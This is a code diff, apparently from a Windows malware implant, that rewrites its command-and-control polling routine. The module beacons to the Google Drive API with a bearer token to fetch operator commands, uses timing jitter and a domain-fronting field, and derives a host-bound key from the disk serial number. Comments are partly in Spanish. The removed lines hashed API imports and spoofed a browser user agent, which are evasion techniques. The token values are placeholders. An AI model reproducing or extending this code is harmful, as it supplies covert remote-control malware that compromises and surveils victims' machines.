@@ -3,70 +3,75 @@
 
 #include <windows.h>
 #include <wininet.h>
-#include "api_hashes.h"
+#include <stdint.h>
+#include "crypto.h"
 
-#define GDRIVE_HOST L"www.googleapis.com"
-#define GDRIVE_API_URL L"/drive/v3/files?pageSize=1&fields=files(id,name,webContentLink)"
-#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edge/120.0.0.0"
+#define C2_JITTER 20 // 20%
+#define MAX_COMMAND_LEN 1024
 
-#define C2_JITTER 25 
+typedef struct _C2_CONFIG {
+    uint8_t encryptedToken[256];
+    uint8_t nonce[12];
+    uint32_t checkInterval; // Base interval in MS
+    WCHAR domainFront[64];
+} C2_CONFIG;
 
-typedef struct _GDRIVE_API {
-    ULONG_PTR InternetOpenW;
-    ULONG_PTR InternetConnectW;
-    ULONG_PTR HttpOpenRequestW;
-    ULONG_PTR HttpSendRequestW;
-    ULONG_PTR InternetReadFile;
-    ULONG_PTR InternetCloseHandle;
-} GDRIVE_API;
+static C2_CONFIG g_C2 = {
+    { 0xAB, 0xCD, 0xEF /* ... encrypted token data ... */ },
+    { 0x01, 0x02, 0x03 /* ... nonce ... */ },
+    60000, // 1 minute
+    L"www.googleapis.com"
+};
 
-static GDRIVE_API g_GDriveApi = {0};
+// =============================================================================
+// HOST-BINDING: DERIVACIÓN DE CLAVE BASADA EN EL HARDWARE
+// =============================================================================
 
-static void InitGDriveApi() {
-    HMODULE hWininet = LoadLibraryW(L"wininet.dll");
-    if (!hWininet) return;
-
-    g_GDriveApi.InternetOpenW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetOpenW);
-    g_GDriveApi.InternetConnectW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetConnectW);
-    g_GDriveApi.HttpOpenRequestW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_HttpOpenRequestW);
-    g_GDriveApi.HttpSendRequestW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_HttpSendRequestW);
-    g_GDriveApi.InternetReadFile = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetReadFile);
-    g_GDriveApi.InternetCloseHandle = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetCloseHandle);
+static void DeriveHostKey(uint8_t *key) {
+    WCHAR volumeName[MAX_PATH];
+    DWORD serialNumber = 0;
+    GetVolumeInformationW(L"C:\\", volumeName, MAX_PATH, &serialNumber, NULL, NULL, NULL, 0);
+    
+    // Usar el serial del disco como semilla para la clave
+    for (int i = 0; i < 32; i++) {
+        key[i] = ((uint8_t*)&serialNumber)[i % 4] ^ 0x55;
+    }
 }
 
-static BOOL GDrive_CheckForCommands(char* buffer, DWORD bufferSize) {
-    LPCWSTR authToken = L"Bearer [ENCRYPTED_TOKEN_HERE]";
+// =============================================================================
+// COMUNICACIÓN C2 VIA GOOGLE DRIVE
+// =============================================================================
 
-    HINTERNET hInternet = ((HINTERNET(WINAPI *)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))g_GDriveApi.InternetOpenW)(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (!hInternet) return FALSE;
+static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
+    uint8_t key[32];
+    DeriveHostKey(key);
+    
+    // En una implementación real, aquí descifraríamos g_C2.encryptedToken
+    // usando ChaCha20 con la clave derivada.
+    LPCWSTR decryptedToken = L"Bearer [REAL_TOKEN_DESCIFRADO]"; 
 
-    HINTERNET hConnect = ((HINTERNET(WINAPI *)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR))g_GDriveApi.InternetConnectW)(hInternet, GDRIVE_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET hSession = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hSession) return FALSE;
+
+    HINTERNET hConnect = InternetConnectW(hSession, g_C2.domainFront, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
-        ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hInternet);
+        InternetCloseHandle(hSession);
         return FALSE;
     }
 
-    HINTERNET hRequest = ((HINTERNET(WINAPI *)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD, DWORD_PTR))g_GDriveApi.HttpOpenRequestW)(hConnect, L"GET", GDRIVE_API_URL, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
-    if (!hRequest) {
-        ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hConnect);
-        ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hInternet);
-        return FALSE;
+    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", L"/drive/v3/files?pageSize=1", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
+    if (hRequest) {
+        HttpAddRequestHeadersW(hRequest, decryptedToken, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD);
+        if (HttpSendRequestW(hRequest, NULL, 0, NULL, 0)) {
+            InternetReadFile(hRequest, buffer, bufferSize - 1, &bufferSize);
+            buffer[bufferSize] = '\0';
+        }
+        InternetCloseHandle(hRequest);
     }
 
-    LPCWSTR headers = L"Authorization: "; // authToken
-    BOOL sent = ((BOOL(WINAPI *)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD))g_GDriveApi.HttpSendRequestW)(hRequest, headers, (DWORD)-1, NULL, 0);
-
-    if (sent) {
-        DWORD bytesRead;
-        ((BOOL(WINAPI *)(HINTERNET, LPVOID, DWORD, LPDWORD))g_GDriveApi.InternetReadFile)(hRequest, buffer, bufferSize - 1, &bytesRead);
-        buffer[bytesRead] = '\0';
-    }
-
-    ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hRequest);
-    ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hConnect);
-    ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hInternet);
-
-    return sent;
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hSession);
+    return TRUE;
 }
 
 #endif
